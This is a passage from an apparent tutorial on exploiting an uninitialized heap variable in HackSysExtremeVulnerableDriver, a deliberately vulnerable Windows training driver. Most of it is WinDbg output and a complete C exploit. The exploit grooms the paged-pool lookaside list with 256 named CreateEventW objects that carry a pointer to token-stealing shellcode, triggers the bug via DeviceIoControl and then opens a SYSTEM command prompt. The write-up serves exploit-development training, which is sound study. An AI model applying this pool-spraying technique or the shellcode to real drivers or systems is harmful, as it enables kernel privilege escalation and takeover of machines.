<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span><span class="o">-&gt;</span><span class="nx">Value</span><span class="p">:</span> <span class="mh">0xBAD0B0B0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span><span class="o">-&gt;</span><span class="nx">Callback</span><span class="p">:</span> <span class="mh">0x905ACD58</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">u</span> <span class="mh">0x905ACD58</span>
<span class="mi">905</span><span class="nx">acd58</span> <span class="mi">688</span><span class="nx">ad95a90</span>      <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">HEVD</span><span class="o">!</span> <span class="o">??</span> <span class="p">::</span><span class="nx">NNGAKEGL</span><span class="p">::</span><span class="s2">`string' (905ad98a)
905acd5d e8a4c2ffff      call    HEVD!DbgPrint (905a9006)
905acd62 59              pop     ecx
</span></code></pre></div></div>

<p>Everything is okay, our template is ready</p>

<p>Let’s provide anything except for 0xBAD0B0B0 value:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Tag</span><span class="p">:</span> <span class="dl">'</span><span class="s1">kcaH</span><span class="dl">'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Type</span><span class="p">:</span> <span class="nx">PagedPool</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0xF0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Chunk</span><span class="p">:</span> <span class="mh">0x8CD65960</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserValue</span><span class="p">:</span> <span class="mh">0x41414141</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span> <span class="nx">Address</span><span class="p">:</span> <span class="mh">0xAB96DA98</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Uninitialized</span> <span class="nx">Heap</span> <span class="nx">Variable</span> <span class="nx">Vulnerability</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span><span class="o">-&gt;</span><span class="nx">Value</span><span class="p">:</span> <span class="mh">0x00000000</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span><span class="o">-&gt;</span><span class="nx">Callback</span><span class="p">:</span> <span class="mh">0x557BBF9D</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">Exception</span> <span class="nx">Code</span><span class="p">:</span> <span class="mh">0xC0000005</span>
</code></pre></div></div>

<p>Looks like the same previous post about Pool Feng-Shui where we used CreateEvent’s</p>

<p>Most important thing to note here is that even though the event object itself is allocated to Non-Paged
Pool, the last parameter, lpName of type LPCTSTR is actually allocated on the Paged Pool.</p>

<p>And we can actually define what it contains and its length.</p>

<p>Important moments to notice:</p>

<ul>
  <li>We’d be grooming the Lookaside list, which are lazy activated only two minutes after the boot.</li>
  <li>Maximum Blocksize for Lookaside list is 0x20, and it only manages upto 256 chunks, after that, any
additional chunks are managed by the ListHead.</li>
  <li>We need to allocate 256 objects of same size and then freeing them. If the list is not populated, then
the allocation would come from ListHead list.</li>
  <li>We need to make sure that the string for the object name is random for each call to object constructor,
as if same string is passed to consecutive calls to object constructor, then only one Pool chuck will be
served for all further requests.</li>
  <li>We also need to make sure that our lpName shouldn’t contain any NULL characters, as that would
change the length of the lpName, and the exploit would fail. (important, here VirtualAlloc wouldn’t work)</li>
</ul>

<p>We’d be giving lpName a size of 0xF0, the header size would be 0x8, total 0xF8 chunks. The shellcode we’d
borrow from our previous tutorial</p>

<p>Thanks Thunder_J for his code</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Tag</span><span class="p">:</span> <span class="dl">'</span><span class="s1">kcaH</span><span class="dl">'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Type</span><span class="p">:</span> <span class="nx">PagedPool</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0xF0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Chunk</span><span class="p">:</span> <span class="mh">0xAE8BCD40</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserValue</span><span class="p">:</span> <span class="mh">0x41414141</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span> <span class="nx">Address</span><span class="p">:</span> <span class="mh">0x8FBD5A98</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Uninitialized</span> <span class="nx">Heap</span> <span class="nx">Variable</span> <span class="nx">Vulnerability</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span><span class="o">-&gt;</span><span class="nx">Value</span><span class="p">:</span> <span class="mh">0x00000000</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span><span class="o">-&gt;</span><span class="nx">Callback</span><span class="p">:</span> <span class="mh">0x0015F990</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mh">0xAE8BCD40</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="nx">ae8bcd40</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="nx">ae8bc000</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">30</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">CMVa</span>
 <span class="nx">ae8bc030</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">30</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">SeAt</span>
<span class="p">...</span>
 <span class="nx">ae8bc7c8</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">570</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Toke </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
<span class="o">*</span><span class="nx">ae8bcd38</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">f8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">570</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
    <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="nx">ae8bcd38</span>
<span class="nx">ReadVirtual</span><span class="p">:</span> <span class="nx">ae8bcd38</span> <span class="nx">not</span> <span class="nx">properly</span> <span class="nx">sign</span> <span class="nx">extended</span>
<span class="nx">ae8bcd38</span>  <span class="mi">061</span><span class="nx">f02ae</span> <span class="mi">6</span><span class="nx">b636148</span> <span class="mi">00000000</span> <span class="mi">0015</span><span class="nx">f990</span>
<span class="nx">ae8bcd48</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="nx">ae8bcd58</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="nx">ae8bcd68</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="nx">ae8bcd78</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="nx">ae8bcd88</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="nx">ae8bcd98</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="nx">ae8bcda8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">u</span> <span class="mi">0015</span><span class="nx">f990</span>
<span class="mi">0015</span><span class="nx">f990</span> <span class="mi">60</span>              <span class="nx">pushad</span>
<span class="mi">0015</span><span class="nx">f991</span> <span class="mi">64</span><span class="nx">a124010000</span>    <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="nx">fs</span><span class="p">:[</span><span class="mi">00000124</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">0015</span><span class="nx">f997</span> <span class="mi">8</span><span class="nx">b4050</span>          <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">50</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">0015</span><span class="nx">f99a</span> <span class="mi">89</span><span class="nx">c1</span>            <span class="nx">mov</span>     <span class="nx">ecx</span><span class="p">,</span><span class="nx">eax</span>
<span class="mi">0015</span><span class="nx">f99c</span> <span class="mi">8</span><span class="nx">b98f8000000</span>    <span class="nx">mov</span>     <span class="nx">ebx</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">0</span><span class="nx">F8h</span><span class="p">]</span>
</code></pre></div></div>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="k">static</span> <span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
  <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
  <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
  <span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">L"cmd.exe"</span> <span class="p">};</span>
  <span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="n">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// Get HANDLE</span>
  <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">,</span>
    <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">OPEN_EXISTING</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Start to get HANDLE...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Failed to get HANDLE!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Success to get HANDLE!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">HANDLE</span> <span class="n">Event_OBJECT</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>

  <span class="kt">char</span> <span class="n">Shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s">"</span><span class="se">\x60</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x64\xA1\x24\x01\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8B\x40\x50</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x89\xC1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8B\x98\xF8\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xBA\x04\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8B\x80\xB8\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2D\xB8\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x39\x90\xB4\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x75\xED</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8B\x90\xF8\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x89\x91\xF8\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xC3</span><span class="s">"</span>
    <span class="p">);</span>

  <span class="c1">//LPVOID Shellcode_Addr = VirtualAlloc(NULL,</span>
  <span class="c1">//  sizeof(Shellcode),</span>
  <span class="c1">//  MEM_COMMIT | MEM_RESERVE,</span>
  <span class="c1">//  PAGE_EXECUTE_READWRITE);</span>

  <span class="c1">//memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode));</span>


  <span class="n">DWORD</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">lpName</span><span class="p">[</span><span class="mh">0xf0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x41</span> <span class="p">};</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">lpName</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"lpName is in 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">lpName</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">lpName</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Shellcode</span><span class="p">;</span>

    <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">lpName</span> <span class="o">+</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">lpName</span> <span class="o">+</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">lpName</span> <span class="o">+</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">lpName</span> <span class="o">+</span> <span class="mh">0xf0</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateEventW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="n">lpName</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">Event_OBJECT</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222033</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="c1">//__debugbreak();</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Start to Create cmd...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">CreateCmd</span><span class="p">();</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

</article>
      </section>
    </div>
  </div>
</body>

</html>
